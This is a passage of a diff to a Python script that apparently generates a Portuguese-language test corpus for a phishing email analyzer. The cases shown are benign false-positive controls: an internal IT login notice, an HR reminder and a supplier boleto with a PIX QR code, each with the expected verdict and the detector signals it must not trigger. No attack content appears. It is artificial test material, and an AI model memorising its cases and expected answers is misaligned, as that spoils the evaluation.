+<p>O novo sistema de ponto já está liberado. Entre com a sua conta corporativa (o mesmo login do Outlook):
+<a href="{alvo}">Acessar o sistema de ponto</a>.</p>
+<p>Dúvidas: Central de Serviços de TI - ramal 4000.</p></body></html>'''
+txt = ('Olá, equipe,\n\nO novo sistema de ponto já está liberado. Entre com a sua conta corporativa (o mesmo login do '
+       f'Outlook): {alvo}\n\nDúvidas: Central de Serviços de TI - ramal 4000.\n')
+corpo = alternativo(txt, htm, '_000_CP8PR80MB4932PONTO_')
+caso(
+    id='L9-ti-interna-login-microsoft',
+    titulo='LEGÍTIMO: TI interna pede login no sistema novo pela página da Microsoft (só perfil básico)',
+    tecnica=('Controle de falso positivo do detector de consentimento OAuth: link oauth2/authorize verdadeiro, mas só pede '
+             'openid/profile/User.Read e devolve para um endereço da própria organização.'),
+    cabecalhos=[('Received', f'from {EXO} (2603:10d6:103:12c::9) by {EXO} with HTTPS; {data}'),
+                ('Authentication-Results', f'dkim=none (message not signed) header.d=none;dmarc=none action=none header.from={ORG};'),
+                ('From', nome_codificado('Central de Serviços de TI', f'servicedesk@{ORG}')),
+                ('To', f'todos@{ORG}'), ('Subject', assunto('Novo sistema de ponto liberado')),
+                ('Date', data), ('Message-ID', f'<CP8PR80MB4932PONTO0900@{EXO}>'),
+                ('X-MS-Exchange-Organization-AuthAs', 'Internal'), ('X-MS-Exchange-Organization-AuthSource', EXO)],
+    corpo=corpo,
+    relato='A TI mandou link para o sistema de ponto que abre a tela da Microsoft. É seguro entrar?',
+    requerente='maria.souza (Financeiro)',
+    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
+    sinais_obrigatorios=[],
+    sinais_proibidos=['oauth-consentimento', 'device-code', 'compartilhamento-falso', 'marca'],
+    bloqueio=dict(deve_ter=[], nao_pode_ter=['login.microsoftonline.com', 'microsoftonline.com', ORG]),
+    reputacao=dict(),
+)
+
+# L10 --------------------------------------------------------------- RH interno lembra a regra da conta salário
+data = 'Tue, 24 Nov 2026 11:30:00 +0000'
+txt = ('Prezados colaboradores,\n\nLembrete: a troca da conta salário só pode ser feita pelo Portal do Colaborador, '
+       'com a sua senha da rede, até o dia 20 de cada mês. O RH nunca aceita pedido de troca de conta pelo e-mail pessoal '
+       'nem por telefone: se receber algo assim em nome de um colega, avise a Segurança da Informação.\n\n'
+       'Recursos Humanos\nCybersecurity Ltda\n')
+corpo = texto(txt)
+caso(
+    id='L10-rh-interno-regra-conta-salario',
+    titulo='LEGÍTIMO: comunicado interno do RH sobre a regra de troca de conta salário',
+    tecnica=('Controle de falso positivo dos detectores de fraude de conta salário e de desculpa (e-mail pessoal): '
+             'o texto fala dos dois, mas vem da própria organização.'),
+    cabecalhos=[('Received', f'from {EXO} (2603:10d6:103:12c::9) by {EXO} with HTTPS; {data}'),
+                ('Authentication-Results', f'dkim=none (message not signed) header.d=none;dmarc=none action=none header.from={ORG};'),
+                ('From', nome_codificado('Recursos Humanos', f'rh@{ORG}')),
+                ('To', f'todos@{ORG}'), ('Subject', assunto('Lembrete: troca de conta salário')),
+                ('Date', data), ('Message-ID', f'<CP8PR80MB4932RH1130@{EXO}>'),
+                ('X-MS-Exchange-Organization-AuthAs', 'Internal'), ('X-MS-Exchange-Organization-AuthSource', EXO)],
+    corpo=corpo,
+    relato='Recebi esse lembrete do RH sobre conta salário. É do RH mesmo?',
+    requerente='joao.lima (RH)',
+    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='HR', gravidade='baixa', mitre=[]),
+    sinais_obrigatorios=[],
+    sinais_proibidos=['bec-conta-salario', 'bec-pretexto', 'bec', 'imita-organizacao'],
+    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
+    reputacao=dict(),
+)
+
+# L11 --------------------------------------------------------------- boleto verdadeiro com QR Code PIX no PDF
+dom = 'graficapaulista.example'
+ip = '198.51.100.200'
+data = 'Wed, 25 Nov 2026 08:30:00 +0000'
+rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
+pix = pix_copia_e_cola('00000000000191', 'GRAFICA PAULISTA LTDA', 'SAO PAULO', '12450.00', 'PED4480')
+txt = ('Prezado cliente,\n\nSegue o boleto do pedido 4480 (vencimento 05/12/2026, R$ 12.450,00). O pagamento também pode '
+       'ser feito por PIX pelo QR Code impresso no boleto.\n\nGráfica Paulista Ltda\nEste é um e-mail automático do sistema de faturamento.\n')
+corpo = MIMEMultipart('mixed')
+corpo.set_boundary('----=_Part_Boleto_4480_1763980200')
+corpo.attach(texto(txt))
+corpo.attach(anexo(pdf_com_qr(['Boleto - Pedido 4480 - GRAFICA PAULISTA LTDA', 'Vencimento 05/12/2026 - R$ 12.450,00',
+                               'Pague com PIX pelo QR Code', 'Documento de teste do corpus do analisador-phishing-glpi'], pix),
+                   'application/pdf', 'Boleto_Pedido_4480.pdf'))
+caso(
+    id='L11-boleto-pix-fornecedor',
+    titulo='LEGÍTIMO: boleto verdadeiro do fornecedor com QR Code PIX no PDF',
+    tecnica=('Controle de falso positivo do leitor de QR: QR Code em PDF é normal em boleto. O QR traz um código PIX '
+             '(não um link), o recebedor é o próprio fornecedor e o e-mail é autenticado de domínio antigo.'),
+    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
+               ('From', nome_codificado('Gráfica Paulista - Faturamento', f'nfe@{dom}')),
+               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('Boleto do pedido 4480 - Gráfica Paulista')),
+               ('Date', data), ('Message-ID', f'<boleto4480.1763980200@{dom}>'), *antispam_exo()],
+    corpo=corpo,
+    relato='Chegou o boleto da gráfica com QR Code de PIX. Pode pagar?',
+    requerente='ana.ribeiro (Financeiro)',
+    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='Finance', gravidade='baixa', mitre=[]),
+    sinais_obrigatorios=['autenticado'],
+    sinais_proibidos=['qrcode-decodificado', 'qrcode-desenhado', 'pdf-com-senha'],
+    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
+    reputacao=dict(rdap={dom: 5120}),
+    qr={'Boleto_Pedido_4480.pdf': [pix]},
+)
+
 # ================================================================ SPAM (não malicioso)
 
 # S1 ---------------------------------------------------------------- newsletter de loja desconhecida
@@ -1275,7 +1596,7 @@ def gravar():
             'sinais_obrigatorios': c.get('sinais_obrigatorios', []), 'sinais_proibidos': c.get('sinais_proibidos', []),
             'sinais_futuros': c.get('sinais_futuros', []),
             'bloqueio': c['bloqueio'], 'reputacao': c.get('reputacao', {}),
-            'ioc_escondido': c.get('ioc_escondido', ''), 'lacuna': c.get('lacuna', ''), 'nota': c.get('nota', ''),
+            'ioc_escondido': c.get('ioc_escondido', ''), 'qr': c.get('qr', {}), 'lacuna': c.get('lacuna', ''), 'nota': c.get('nota', ''),
         })
     with open(os.path.join(AQUI, 'casos.json'), 'w', encoding='utf-8', newline='\n') as f:
         json.dump({'_aviso': 'Gerado por tests/corpus/gerar-corpus.py: edite lá e gere de novo.', 'casos': casos_json},
